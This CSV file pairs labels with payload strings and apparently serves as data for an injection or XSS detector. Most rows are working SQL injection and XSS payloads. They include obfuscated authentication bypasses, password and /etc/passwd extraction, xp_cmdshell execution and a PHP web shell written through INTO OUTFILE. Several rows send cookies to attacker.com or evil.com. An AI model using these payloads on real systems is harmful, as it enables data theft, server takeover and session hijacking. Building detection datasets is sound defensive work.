payload,label
"SELECT /*!32302 1,2*/ FROM users WHERE username='admin' --",1
"UNION /*!50000SELECT*/ 1,2,3 FROM users WHERE username='admin'",1
"OR 1=1 /*!50000--*/",1
"0x273b SELECT /*!12345* FROM users WHERE id=1 -- 0x273b",1
"SELECT+/*!11444*/+password+FROM+users+WHERE+id=1",1
"admin'/**/OR/**/'1'/**/=/**/'1'--",1
"'/**/OR/**/1=1/**/--/**/",1
"';DECLARE @S varchar(8000);SET @S=CAST(0x73656C65637420636F6C756D6E312066726F6D207461626C65207573657273 AS varchar(8000));EXEC(@S);--",1
"OR/**/1=1--",1
"<script>eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhhbXBsZS5jb20n'))</script>",1
"<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>",1
"'or/**/convert(int,'1')/**/=/**/1--",1
"'or/**/convert(int,0x31)/**/=/**/1--",1
"<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",1
"1/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL--",1
"admin' UNION SELECT null,null,'<script>alert(\"XSS\")</script>' --",1
"'+(SELECT/**/password/**/FROM/**/users/**/WHERE/**/id=1)--",1
"' OR 'a'='a' OR 'x'='x' --",1
"' OR 'x'='x' --",1
"' OR 1=1;--",1
"' OR '1'='1' /* bypass */",1
"1; EXEC xp_cmdshell('whoami'); --",1
"' OR pg_sleep(5) --",1
"' OR benchmark(50000000,sha1('test')) --",1
"' OR ascii(substr((SELECT password FROM users WHERE id=1),1,1))=97 --",1
"' UNION SELECT NULL,concat(username,':',password) FROM users --",1
"1 UNION SELECT password FROM mysql.user --",1
"1 UNION SELECT load_file('/etc/passwd') --",1
"1 UNION SELECT 'malicious_payload' INTO OUTFILE '/var/www/html/shell.php' --",1
"1 UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/backdoor.php' --",1
"<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",1
"<img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>",1
"<svg/onload=fetch('https://attacker.com/steal?cookie='+document.cookie)>",1
"'><script>document.location='http://evil.com/?c='+document.cookie</script>",1
"<body/onload='javascript:fetch(\"http://attacker.com?c=\"+document.cookie)'>",1
"test_payload",0
"normal input",0
"benign request",0
"safe payload",0
"hello world",0
